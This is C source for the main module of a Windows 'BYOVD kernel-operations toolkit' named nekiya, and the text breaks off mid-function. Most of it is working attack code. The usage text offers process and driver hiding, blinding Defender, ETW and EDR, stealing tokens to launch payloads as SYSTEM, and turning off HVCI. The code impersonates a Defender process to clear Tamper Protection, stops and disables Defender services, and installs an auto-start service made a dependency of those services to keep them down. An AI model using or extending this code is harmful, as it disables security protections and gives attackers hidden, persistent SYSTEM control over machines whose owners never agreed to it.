#include "ft.h"

#include <stdlib.h>

#define FT_SERVICE_NAME "nekiya-sys"
#define FT_DISARM_SERVICE_NAME "nekiya-disarm"
#include <string.h>

enum {
    ACT_HIDE_PID = 0,
    ACT_HIDE_NAME,
    ACT_HIDE_DRIVER,
    ACT_BLIND,
    ACT_NUKE,
    ACT_ELEVATE_PID,
    ACT_LAUNCH,
    ACT_LAUNCH_AS,
    ACT_HVCI_OFF,
    ACT_KILL,
    ACT_DISARM,
    ACT_ARM
};

static const char* ft_act_name(int kind) {
    switch (kind) {
    case ACT_HIDE_PID:    return "hide_pid";
    case ACT_HIDE_NAME:  return "hide_name";
    case ACT_HIDE_DRIVER:return "hide_driver";
    case ACT_BLIND:      return "blind";
    case ACT_NUKE:       return "nuke";
    case ACT_ELEVATE_PID:return "elevate_pid";
    case ACT_LAUNCH:     return "launch";
    case ACT_LAUNCH_AS:  return "launch_as";
    case ACT_HVCI_OFF:   return "hvci_off";
    case ACT_KILL:       return "kill";
    case ACT_DISARM:     return "disarm";
    case ACT_ARM:        return "arm";
    default:             return "?";
    }
}

#define FT_MAX_ACTIONS 64
#define FT_MAX_ARGSV   32

typedef struct ft_act {
    int          kind;
    uint32_t     pid;
    const char*  str;
    char* const* argv;
    int          argc;
    int          visible;
    int          rc;
} ft_act;

static void ft_usage(void) {
    printf(
"nekiya - BYOVD kernel-operations toolkit\n"
"\n"
"ACTIONS (combinable, executed in the order given)\n"
"  --hide <pid>            DKOM-hide a process from kernel enumeration\n"
"  --hide-name <name>      DKOM-hide a process by image name\n"
"  --hide-driver <name>    DKOM-hide a driver from PsLoadedModuleList\n"
"  --blind                 blind Defender + telemetry (ETW-TI provider,\n"
"                          ETW sessions, EDR kernel callbacks, Defender\n"
"                          policy, agent processes, services)\n"
"  --nuke                  full teardown: everything --blind does plus\n"
"                          service deletion, policy tree removal, exclusions\n"
"  --elevate <pid|self>    replace the target's primary token with SYSTEM\n"
"  --launch <exe>          launch a payload as SYSTEM\n"
"  --launch-as <pid> <exe> launch a payload with the target PID's token\n"
"  --hvci-off              disable HVCI + the vulnerable-driver blocklist\n"
"\n"
"OPTIONS\n"
"  --dry-run               validate everything, write nothing\n"
"  --json                  print a JSON result document at the end\n"
"  --json-out <path>       write the JSON result document to a file\n"
"  --status <path>         append JSONL events to a file\n"
"  --sys <path>            path to the BYOVD driver (msft.sys)\n"
"  --visible               launch payloads with a visible console\n"
"  --keep-services         --nuke: disable services, do not delete them\n"
"  --edr <name>            extra EDR kernel driver for callback removal\n"
"  --kill <name>           extra process name to terminate\n"
"  --arg <value>           extra argument for the last --launch\n"
"  --                      everything after this belongs to the last --launch\n"
#ifdef FT_DIAGNOSTICS
"  --selftest              offline self checks (no kernel access needed)\n"
"  --doctor                environment report (driver, HVCI, Defender, ETW)\n"
"  --exports <pattern>      list matching ntoskrnl.exe exports\n"
#endif
"  -h, --help              this text\n"
"\n"
"EXAMPLES\n"
"  nekiya.exe --hide 8473\n"
"  nekiya.exe --hide 8473 --hide-driver edrdrv.sys --blind\n"
"  nekiya.exe --elevate 1234 --launch C:\\Windows\\Temp\\p.exe --arg -x\n"
"  nekiya.exe --nuke --dry-run\n");
}

static int ft_parse_u32(const char* s, uint32_t* out) {
    char* end = NULL;
    unsigned long v;
    if (!s || !*s) return 0;
    v = strtoul(s, &end, 10);
    if (!end || *end != '\0' || v == 0 || v > 0xFFFFFFFFul) return 0;
    *out = (uint32_t)v;
    return 1;
}

static void ft_self_dir(const char* argv0, char* out, size_t cap) {
    DWORD n;
    (void)argv0;
    char* p;

    out[0] = '\0';
    n = GetModuleFileNameA(NULL, out, (DWORD)cap);
    if (n == 0 || n >= cap) { out[0] = '\0'; return; }
    p = strrchr(out, '\\');
    if (!p) { out[0] = '\0'; return; }
    *p = '\0';
}

int ft_selftest(ft_ctx* c);

static int ft_start_service_and_wait(ft_ctx* ctx, const char* action, const char* status_path);

static int ft_install_disarm_service(ft_ctx* ctx);

static int ft_first_run_arm(ft_ctx* ctx) {
    int rc = ft_install_disarm_service(ctx);
    if (rc == FT_OK) {
        ft_ok(ctx, "armed", "\"service\":\"%s\"", FT_DISARM_SERVICE_NAME);
    }
    return rc;
}

static int ft_run_privileged_action(ft_ctx* ctx, const char* action) {
    char tmp[FT_MAX_PATH];
    char line[2048];
    FILE* f;
    int rc;

    if (!GetTempPathA((DWORD)sizeof tmp, tmp)) return FT_E_INTERNAL;
    {
        size_t n = strlen(tmp);
        _snprintf(tmp + n, sizeof tmp - n, "nekiya_svc_%lu.jsonl",
                  (unsigned long)GetCurrentProcessId());
    }
    rc = ft_start_service_and_wait(ctx, action, tmp);
    if (rc == FT_OK) {

        ft_first_run_arm(ctx);
    }
    f = fopen(tmp, "r");
    if (f) {
        while (fgets(line, (int)sizeof line, f)) {
            size_t n = strlen(line);
            while (n > 0 && (line[n - 1] == '\n' || line[n - 1] == '\r')) line[--n] = 0;
            if (n) {
                int svc_rc = -1;
                if (strstr(line, "\"event\":\"service_done\"")) {
                    const char* q = strstr(line, "\"rc\":");
                    if (q) svc_rc = atoi(q + 5);
                }
                if (svc_rc > 0 && rc == FT_OK) rc = svc_rc;
                printf("  %s\\n", line);
                ft_status_raw(ctx, line);
            }
        }
        fclose(f);
        DeleteFileA(tmp);
    }
    if (rc == FT_OK) {
        ft_ok(ctx, "privileged_ok", "\"action\":\"%s\"", action);
    } else {
        ft_err(ctx, "privileged_failed", "\"action\":\"%s\",\"rc\":%d", action, rc);
    }
    return rc;
}

int ft_disarm_live(ft_ctx* ctx) {
    static const char* sense_names[] = { "MsSense.exe", "Sense.exe", NULL };
    static const char* paths[] = {
        "SOFTWARE\\Microsoft\\Windows Defender\\Features",
        "SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection",
        NULL
    };
    uint32_t pid = 0;
    HANDLE proc = NULL;
    HANDLE tok = NULL;
    HANDLE dup = NULL;
    int i;
    int changed = 0;

    for (i = 0; sense_names[i]; i++) {
        if (ft_proc_find_by_name(ctx, sense_names[i], &pid) && pid) break;
        pid = 0;
    }
    if (!pid) {
        ft_info(ctx, "sense_not_running", "\"hint\":\"sensing service not running\"");
        return 0;
    }
    proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc) proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) {
        ft_warn(ctx, "sense_open_failed", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        return 0;
    }
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        ft_warn(ctx, "sense_token_failed", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        CloseHandle(proc);
        return 0;
    }
    CloseHandle(proc);
    if (!DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                          TokenPrimary, &dup)) {
        ft_warn(ctx, "sense_duplicate_failed", "\"err\":%lu", GetLastError());
        CloseHandle(tok);
        return 0;
    }
    CloseHandle(tok);
    if (!ImpersonateLoggedOnUser(dup)) {
        ft_warn(ctx, "sense_impersonate_failed", "\"pid\":%u,\"err\":%lu", pid, GetLastError());
        CloseHandle(dup);
        return 0;
    }
    CloseHandle(dup);
    for (i = 0; paths[i]; i++) {
        DWORD cur = 0;
        if (ft_reg_get_dword(paths[i], "TamperProtection", &cur) && cur == 0) {
            ft_info(ctx, "sense_tamper_already", "\"path\":\"%s\"", paths[i]);
            continue;
        }
        if (ft_reg_set_dword(paths[i], "TamperProtection", 0)) {
            changed++;
            ft_ok(ctx, "sense_tamper_ok", "\"path\":\"%s\"", paths[i]);
        } else {
            ft_warn(ctx, "sense_tamper_failed", "\"path\":\"%s\",\"err\":%lu",
                    paths[i], GetLastError());
        }
    }
    RevertToSelf();
    return changed;
}

static int ft_disarm_service_run(ft_ctx* ctx) {
    static const char* tamper_paths[] = {
        "SOFTWARE\\Microsoft\\Windows Defender\\Features",
        "SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection",
        NULL
    };
    static const char* svc_keys[] = {
        "SYSTEM\\CurrentControlSet\\Services\\WinDefend",
        "SYSTEM\\CurrentControlSet\\Services\\WdNisSvc",
        "SYSTEM\\CurrentControlSet\\Services\\WdFilter",
        "SYSTEM\\CurrentControlSet\\Services\\Sense",
        NULL
    };
    int i;
    int done = 0;

    if (!ctx) return FT_E_INTERNAL;
    ft_info(ctx, "disarm_start", "\"pid\":%u", ft_proc_self_pid());

    for (i = 0; tamper_paths[i]; i++) {
        const char* p = tamper_paths[i];
        const char* name = (strstr(p, "Features") &&
                           p[strlen(p) - 1] != 's') ? "TamperProtection" : "TamperProtection";
        DWORD cur = 0;
        if (ft_reg_get_dword(p, name, &cur) && cur == 0) {
            ft_info(ctx, "disarm_tamper_already", "\"path\":\"%s\"", p);
            done++;
            continue;
        }
        if (ft_reg_set_dword(p, name, 0)) {
            done++;
            ft_info(ctx, "disarm_tamper_ok", "\"path\":\"%s\"", p);
        } else {
            ft_warn(ctx, "disarm_tamper_failed", "\"path\":\"%s\"", p);
        }
    }

    for (i = 0; svc_keys[i]; i++) {
        HKEY hk;
        LONG rc = RegOpenKeyExA(HKEY_LOCAL_MACHINE, svc_keys[i], 0,
                                KEY_SET_VALUE | KEY_WOW64_64KEY, &hk);
        if (rc != ERROR_SUCCESS) {
            ft_info(ctx, "disarm_launchprot_absent", "\"path\":\"%s\"", svc_keys[i]);
            continue;
        }
        rc = RegDeleteValueA(hk, "LaunchProtected");
        RegCloseKey(hk);
        if (rc == ERROR_SUCCESS) {
            done++;
            ft_info(ctx, "disarm_launchprot_removed", "\"path\":\"%s\"", svc_keys[i]);
        } else {
            ft_warn(ctx, "disarm_launchprot_failed", "\"path\":\"%s\",\"err\":%ld",
                    svc_keys[i], rc);
        }
    }

    {
        static const char* names[] = { "Sense", "WinDefend", "WdNisSvc",
                                       "WdFilter", NULL };
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            int k;
            for (k = 0; names[k]; k++) {
                SC_HANDLE s = OpenServiceA(scm, names[k],
                                            SERVICE_STOP | SERVICE_CHANGE_CONFIG);
                if (!s) {
                    if (GetLastError() == ERROR_SERVICE_DISABLED) {
                        ft_info(ctx, "disarm_svc_already_disabled", "\"name\":\"%s\"",
                                names[k]);
                    } else {
                        ft_info(ctx, "disarm_svc_absent", "\"name\":\"%s\"", names[k]);
                    }
                    continue;
                }
                ControlService(s, SERVICE_CONTROL_STOP, NULL);
                ChangeServiceConfigA(s, SERVICE_NO_CHANGE, SERVICE_DISABLED,
                                     SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL,
                                     NULL, NULL, NULL);
                ft_info(ctx, "disarm_svc_disabled", "\"name\":\"%s\"", names[k]);
                CloseServiceHandle(s);
            }
            CloseServiceHandle(scm);
        }
    }

    ft_info(ctx, "disarm_done", "\"steps\":%d", done);
    return FT_OK;
}

static int ft_install_disarm_service(ft_ctx* ctx) {
    SC_HANDLE scm;
    SC_HANDLE svc;
    char binpath[1200];
    int rc = FT_OK;

    if (!ctx) return FT_E_INTERNAL;
    if (!GetModuleFileNameA(NULL, binpath, (DWORD)sizeof binpath)) return FT_E_INTERNAL;
    {
        char tmp[1400];
        _snprintf(tmp, sizeof tmp, "\"%s\" --service disarm --status \"%s\"", binpath, "C:\\Windows\\Temp\\nekiya_disarm.jsonl");
        scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
        if (!scm) {
            ft_warn(ctx, "disarm_scm_failed", "\"err\":%lu", GetLastError());
            return FT_E_SVC;
        }
        svc = NULL;
        {
            int attempt;
            for (attempt = 0; attempt < 40 && !svc; attempt++) {
                svc = CreateServiceA(scm, FT_DISARM_SERVICE_NAME, FT_DISARM_SERVICE_NAME,
                                     SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                     SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
                                     tmp, NULL, NULL, NULL, NULL, NULL);
                if (svc) break;
                {
                    LONG err = GetLastError();
                    if (err == ERROR_SERVICE_MARKED_FOR_DELETE) { Sleep(500); continue; }
                    if (err == ERROR_SERVICE_EXISTS) {
                        SC_HANDLE old = OpenServiceA(scm, FT_DISARM_SERVICE_NAME, DELETE);
                        if (old) { DeleteService(old); CloseServiceHandle(old); }
                        Sleep(300);
                        continue;
                    }
                    break;
                }
            }
        }
        if (svc) {
            ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
                                 SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL,
                                 NULL, NULL, NULL);
            ft_info(ctx, "disarm_service_installed", "\"name\":\"%s\"", FT_DISARM_SERVICE_NAME);
        } else {
            ft_warn(ctx, "disarm_service_create_failed", "\"err\":%lu",
                    GetLastError());
            rc = FT_E_SVC;
        }
        if (svc) {
            StartServiceA(svc, 0, NULL);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }

    {
        static const char* deps[] = { "WinDefend", "Sense", "WdNisSvc", NULL };
        int i;
        for (i = 0; deps[i]; i++) {
            char keypath[128];
            HKEY hk;
            LONG rcx;
            _snprintf(keypath, sizeof keypath,
                      "SYSTEM\\CurrentControlSet\\Services\\%s", deps[i]);
            rcx = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keypath, 0,
                                KEY_SET_VALUE | KEY_WOW64_64KEY, &hk);
            if (rcx == ERROR_SUCCESS) {
                RegSetValueExA(hk, "DependOnService", 0, REG_MULTI_SZ,
                               (const BYTE*)FT_DISARM_SERVICE_NAME,
                               (DWORD)(sizeof(FT_DISARM_SERVICE_NAME)));
                RegCloseKey(hk);
                ft_info(ctx, "disarm_dependency_set", "\"target\":\"%s\"", deps[i]);
            } else {
                ft_warn(ctx, "disarm_dependency_failed", "\"target\":\"%s\",\"err\":%ld",
                        deps[i], rcx);
            }
        }
    }
    return rc;
}

static char g_svc_action[32];
static char g_svc_status[FT_MAX_PATH];
static int  g_dry_run = 0;
static SERVICE_STATUS g_svc_ss;
static SERVICE_STATUS_HANDLE g_svc_handle = NULL;

static void ft_svc_report(DWORD state) {
    if (!g_svc_handle) return;
    g_svc_ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svc_ss.dwCurrentState = state;
    g_svc_ss.dwControlsAccepted = 0;
    g_svc_ss.dwWin32ExitCode = NO_ERROR;
    g_svc_ss.dwServiceSpecificExitCode = 0;
    SetServiceStatus(g_svc_handle, &g_svc_ss);
}

static DWORD WINAPI ft_svc_handler_ex(DWORD ctrl, DWORD ev, LPVOID data,
                                       LPVOID ctx) {
    (void)ctrl; (void)ev; (void)data; (void)ctx;
    return NO_ERROR;
}

static void ft_service_main(DWORD argc, LPSTR* argv) {
    ft_ctx ctx;
    int rc = 0;

    (void)argc;
    (void)argv;
    memset(&ctx, 0, sizeof ctx);
    ft_sb_init(&ctx.json);
    ft_get_build(&ctx.build);
    ctx.dry_run = g_dry_run;
    if (g_svc_status[0]) ft_status_open(&ctx, g_svc_status);
    ft_self_dir(NULL, ctx.self_dir, sizeof ctx.self_dir);
    {
        static const char* rels[] = {
            "\\msft.sys",
            "\\kernel\\msft.sys",
            "\\..\\kernel\\msft.sys",
            NULL
        };
        int r;
        for (r = 0; rels[r] && !ctx.sys_path[0]; r++) {
            char cand[FT_MAX_PATH + 64];
            snprintf(cand, sizeof cand, "%s%s", ctx.self_dir, rels[r]);
            if (GetFileAttributesA(cand) != INVALID_FILE_ATTRIBUTES) {
                strncpy(ctx.sys_path, cand, sizeof ctx.sys_path - 1);
                ctx.sys_path[sizeof ctx.sys_path - 1] = '\0';
            }
        }
    }

    g_svc_handle = RegisterServiceCtrlHandlerExA((strcmp(g_svc_action, "disarm") == 0) ? FT_DISARM_SERVICE_NAME : FT_SERVICE_NAME,
                                                ft_svc_handler_ex, NULL);
    ft_svc_report(SERVICE_START_PENDING);
    ft_svc_report(SERVICE_RUNNING);
    {
        uint64_t luid = 0;
        if (ft_token_id_of_process(NULL, 0, &luid)) {
            ft_info(&ctx, "service_identity", "\"luid\":\"0x%llx\",\"system\":%d",
                    (unsigned long long)luid, ft_proc_is_system(&ctx));
        } else {
            ft_info(&ctx, "service_identity", "\"luid\":\"?\",\"system\":%d",
                    ft_proc_is_system(&ctx));
        }
    }
    ft_info(&ctx, "service_start", "\"action\":\"%s\",\"pid\":%u",
            g_svc_action, ft_proc_self_pid());

    if (!ft_km_open(&ctx)) {
        ft_err(&ctx, "service_no_km", "");
        rc = FT_E_KM;
    } else {
        if (ft_proc_derive_layout(&ctx) != FT_OK) {
            rc = FT_E_BUILD;
        } else if (strcmp(g_svc_action, "nuke") == 0) {
            rc = ft_blind_run(&ctx, 1, 0);
        } else if (strcmp(g_svc_action, "disarm") == 0) {
            rc = ft_disarm_service_run(&ctx);
        } else {
            rc = ft_blind_run(&ctx, 0, 0);
        }
    }
    ft_info(&ctx, "service_done", "\"rc\":%d", rc);
    ft_km_close(&ctx);
    ft_status_close(&ctx);
    ft_svc_report(SERVICE_STOPPED);
}

static int ft_start_service_and_wait(ft_ctx* ctx, const char* action, const char* status_path) {
    SC_HANDLE scm;
    SC_HANDLE svc;
    SERVICE_STATUS ss;
    DWORD wait = 0;
    int rc = 0;
    char binpath[1024];
    char qstatus[FT_MAX_PATH];
    char tmp[1200];

    if (!GetModuleFileNameA(NULL, binpath, (DWORD)sizeof binpath)) return FT_E_INTERNAL;
    _snprintf(qstatus, sizeof qstatus, "\"%s\"", status_path ? status_path : "");
    _snprintf(tmp, sizeof tmp, "\"%s\" --service %s --status %s%s",
               binpath, action, qstatus, (ctx && ctx->dry_run) ? " --dry-run" : "");

    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        ft_err(ctx, "service_scm_failed", "\"err\":%lu", GetLastError());
        return FT_E_SVC;
    }
    svc = NULL;
    {
        int attempt;
        for (attempt = 0; attempt < 40 && !svc; attempt++) {
            svc = CreateServiceA(scm, FT_SERVICE_NAME, FT_SERVICE_NAME,
                                 SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                 SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                                 tmp, NULL, NULL, NULL, NULL, NULL);
            if (!svc) {
                LONG err = GetLastError();
                if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {

                    Sleep(500);
                    continue;
                }
                if (err == ERROR_SERVICE_EXISTS) {
                    SC_HANDLE old = OpenServiceA(scm, FT_SERVICE_NAME, DELETE);
                    if (old) { DeleteService(old); CloseServiceHandle(old); }
                    Sleep(300);
                    continue;
                }
                ft_err(ctx, "service_create_failed", "\"err\":%ld", err);
                break;
            }
        }
    }
    if (!svc) {
        CloseServiceHandle(scm);
        return FT_E_SVC;
    }
    if (!StartServiceA(svc, 0, NULL)) {
        ft_warn(ctx, "service_start_failed", "\"err\":%lu", GetLastError());
    }
    for (wait = 0; wait < 900; wait++) {
        if (!QueryServiceStatus(svc, &ss)) break;
        if (ss.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(100);
    }
    if (wait >= 900) {
        ft_err(ctx, "service_timeout", "\"action\":\"%s\"", action);
        rc = FT_E_SVC;
    }
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return rc;
}

static int ft_service_dispatch(void) {
    SERVICE_TABLE_ENTRYA table[2];

    table[0].lpServiceName = (LPSTR)((strcmp(g_svc_action, "disarm") == 0) ? FT_DISARM_SERVICE_NAME : FT_SERVICE_NAME);
    table[0].lpServiceProc = ft_service_main;
    table[1].lpServiceName = NULL;
    table[1].lpServiceProc = NULL;
    if (!StartServiceCtrlDispatcherA(table)) {
        return FT_E_SVC;
    }
    return FT_OK;
}

int main(int argc, char** argv) {
    ft_ctx ctx;
    ft_act acts[FT_MAX_ACTIONS];
    int nact = 0;
    int i;
    int rc;
    int rc_final = 0;
    int want_json = 0;
    const char* json_out = NULL;
    const char* status_path = NULL;
    const char* sys_path = NULL;
    int keep_services = 0;
    int visible = 0;
    int selftest = 0;
    int doctor = 0;
    int edr_nullify = 0;
    const char* helper_out = NULL;
    const char* svc_action = NULL;
    const char* export_pat = NULL;
    const char* extra_edr[32];
    int nextra_edr = 0;
    const char* extra_kill[32];
    int nextra_kill = 0;
    char* launch_args[FT_MAX_ARGSV] = {0};
    int nlaunch_args = 0;
    int need_km = 0;
    int need_system = 0;
    int any_action = 0;

    memset(&ctx, 0, sizeof ctx);
    memset(acts, 0, sizeof acts);
    ft_sb_init(&ctx.json);

    for (i = 1; i < argc; i++) {
        const char* a = argv[i];

        if (strcmp(a, "--") == 0) {

            int k;
            for (k = i + 1; k < argc && nlaunch_args < FT_MAX_ARGSV; k++) {
                launch_args[nlaunch_args++] = argv[k];
            }
            if (nact > 0 && acts[nact - 1].kind == ACT_LAUNCH) {
                acts[nact - 1].argv = launch_args;
                acts[nact - 1].argc = nlaunch_args;
            }
            break;
        }
        if (strcmp(a, "-h") == 0 || strcmp(a, "--help") == 0) {
            ft_usage();
            return 0;
        }
        if (strcmp(a, "--dry-run") == 0) { ctx.dry_run = 1; g_dry_run = 1; continue; }
        if (strcmp(a, "--json") == 0) { want_json = 1; continue; }
        if (strcmp(a, "--visible") == 0) { visible = 1; continue; }
        if (strcmp(a, "--keep-services") == 0) { keep_services = 1; continue; }
#ifdef FT_DIAGNOSTICS
        if (strcmp(a, "--selftest") == 0) { selftest = 1; continue; }
        if (strcmp(a, "--doctor") == 0) { doctor = 1; continue; }
        if (strcmp(a, "--exports") == 0 && i + 1 < argc) { export_pat = argv[++i]; continue; }
#endif
        if (strcmp(a, "--etw-worker") == 0 && i + 2 < argc) {

            const char* outp = argv[++i];
            int stop = (atoi(argv[++i]) != 0);
            return ft_etw_worker_main(outp, stop);
        }
        if (strcmp(a, "--verbose") == 0) { ctx.verbose = 1; continue; }

        if (strcmp(a, "--json-out") == 0 && i + 1 < argc) { json_out = argv[++i]; continue; }
        if (strcmp(a, "--status") == 0 && i + 1 < argc) { status_path = argv[++i]; continue; }
        if (strcmp(a, "--sys") == 0 && i + 1 < argc) { sys_path = argv[++i]; continue; }
        if (strcmp(a, "--arg") == 0 && i + 1 < argc) {
            if (nlaunch_args < FT_MAX_ARGSV) {
                launch_args[nlaunch_args++] = argv[++i];
                if (nact > 0 && (acts[nact - 1].kind == ACT_LAUNCH ||
                                 acts[nact - 1].kind == ACT_LAUNCH_AS)) {
                    acts[nact - 1].argc = nlaunch_args;
                }
            }
            continue;
        }
        if (strcmp(a, "--edr") == 0 && i + 1 < argc) {
            if (nextra_edr < 32) extra_edr[nextra_edr++] = argv[++i];
            continue;
        }
        if (strcmp(a, "--edr-nullify") == 0) { edr_nullify = 1; continue; }
        if (strcmp(a, "--disarm") == 0) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_DISARM;
            nact++;
            any_action = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--arm") == 0) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_ARM;
            nact++;
            any_action = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--sys-helper") == 0 && i + 1 < argc) { helper_out = argv[++i]; continue; }
        if (strcmp(a, "--service") == 0 && i + 1 < argc) { svc_action = argv[++i]; continue; }
        if (strcmp(a, "--kill") == 0 && i + 1 < argc) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_KILL;
            acts[nact].str = argv[++i];
            nact++;
            any_action = 1;
            need_system = 1;
            continue;
        }

        if (strcmp(a, "--hide") == 0 && i + 1 < argc) {
            uint32_t pid = 0;
            if (!ft_parse_u32(argv[++i], &pid)) {
                fprintf(stderr, "nekiya: --hide needs a numeric pid\n");
                return FT_E_ARGS;
            }
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_HIDE_PID;
            acts[nact].pid = pid;
            nact++;
            any_action = 1;
            need_km = 1;
            continue;
        }
        if (strcmp(a, "--hide-name") == 0 && i + 1 < argc) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_HIDE_NAME;
            acts[nact].str = argv[++i];
            nact++;
            any_action = 1;
            need_km = 1;
            continue;
        }
        if (strcmp(a, "--hide-driver") == 0 && i + 1 < argc) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_HIDE_DRIVER;
            acts[nact].str = argv[++i];
            nact++;
            any_action = 1;
            need_km = 1;
            continue;
        }
        if (strcmp(a, "--blind") == 0) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_BLIND;
            nact++;
            any_action = 1;
            need_km = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--nuke") == 0) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_NUKE;
            nact++;
            any_action = 1;
            need_km = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--elevate") == 0 && i + 1 < argc) {
            const char* v = argv[++i];
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            if (_stricmp(v, "self") == 0) {
                acts[nact].kind = ACT_ELEVATE_PID;
                acts[nact].pid = 0;
            } else {
                uint32_t pid = 0;
                if (!ft_parse_u32(v, &pid)) {
                    fprintf(stderr, "nekiya: --elevate needs a pid or 'self'\n");
                    return FT_E_ARGS;
                }
                acts[nact].kind = ACT_ELEVATE_PID;
                acts[nact].pid = pid;
            }
            nact++;
            any_action = 1;
            need_km = 1;
            continue;
        }
        if (strcmp(a, "--launch") == 0 && i + 1 < argc) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_LAUNCH;
            acts[nact].str = argv[++i];
            acts[nact].argv = launch_args;
            acts[nact].argc = nlaunch_args;
            acts[nact].visible = visible;
            nact++;
            any_action = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--launch-as") == 0 && i + 2 < argc) {
            uint32_t pid = 0;
            if (!ft_parse_u32(argv[i + 1], &pid)) {
                fprintf(stderr, "nekiya: --launch-as needs a pid\n");
                return FT_E_ARGS;
            }
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_LAUNCH_AS;
            acts[nact].pid = pid;
            acts[nact].str = argv[i + 2];
            acts[nact].argv = launch_args;
            acts[nact].argc = nlaunch_args;
            acts[nact].visible = visible;
            nact++;
            i += 2;
            any_action = 1;
            need_system = 1;
            continue;
        }
        if (strcmp(a, "--hvci-off") == 0) {
            if (nact >= FT_MAX_ACTIONS) { fprintf(stderr, "nekiya: too many actions\n"); return FT_E_ARGS; }
            acts[nact].kind = ACT_HVCI_OFF;
            nact++;
            any_action = 1;
            need_system = 1;
            continue;
        }

        fprintf(stderr, "nekiya: unknown option '%s'\n", a);
        ft_usage();
        return FT_E_ARGS;
    }

    if (export_pat) {
#ifdef FT_DIAGNOSTICS
        return ft_list_exports(export_pat);
#else
        fprintf(stderr, "nekiya: --exports is not in this build\n");
        return FT_E_ARGS;
#endif
    }

    if (selftest) {
#ifdef FT_DIAGNOSTICS
        ft_self_dir(argv[0], ctx.self_dir, sizeof ctx.self_dir);
        rc = ft_selftest(&ctx);
        return rc;
#endif
    }

    if (doctor) {
#ifdef FT_DIAGNOSTICS
        ft_self_dir(argv[0], ctx.self_dir, sizeof ctx.self_dir);
        ft_get_build(&ctx.build);
        if (status_path) ft_status_open(&ctx, status_path);
        if (!ft_km_open(&ctx)) {
            ft_warn(&ctx, "doctor_no_km", "\"hint\":\"kernel primitive unavailable\"");
        } else {
            ft_proc_derive_layout(&ctx);
        }
        rc = ft_doctor(&ctx);
        ft_km_close(&ctx);
        ft_status_close(&ctx);
        return rc;
#endif
    }

    if (svc_action) {

        _snprintf(g_svc_action, sizeof g_svc_action, "%s", svc_action);
        if (status_path) {
            strncpy(g_svc_status, status_path, sizeof g_svc_status - 1);
            g_svc_status[sizeof g_svc_status - 1] = '\0';
        }
        rc = ft_service_dispatch();
        ft_status_close(&ctx);
        return rc;
    }

    if (!any_action) {
        ft_usage();
        return FT_E_ARGS;
    }

    ft_self_dir(argv[0], ctx.self_dir, sizeof ctx.self_dir);
    ft_get_build(&ctx.build);

    if (helper_out) {

        ft_status_open(&ctx, helper_out);
    } else if (status_path) {
        ft_status_open(&ctx, status_path);
    }
    if (sys_path) {
        strncpy(ctx.sys_path, sys_path, sizeof ctx.sys_path - 1);
        ctx.sys_path[sizeof ctx.sys_path - 1] = '\0';
    } else {

        static const char* rels[] = {
            "\\msft.sys",
            "\\kernel\\msft.sys",
            "\\..\\kernel\\msft.sys",
            NULL
        };
        int r;
        for (r = 0; rels[r] && !ctx.sys_path[0]; r++) {
            char cand[FT_MAX_PATH + 64];
            snprintf(cand, sizeof cand, "%s%s", ctx.self_dir, rels[r]);
            if (GetFileAttributesA(cand) != INVALID_FILE_ATTRIBUTES) {
                strncpy(ctx.sys_path, cand, sizeof ctx.sys_path - 1);
                ctx.sys_path[sizeof ctx.sys_path - 1] = '\0';
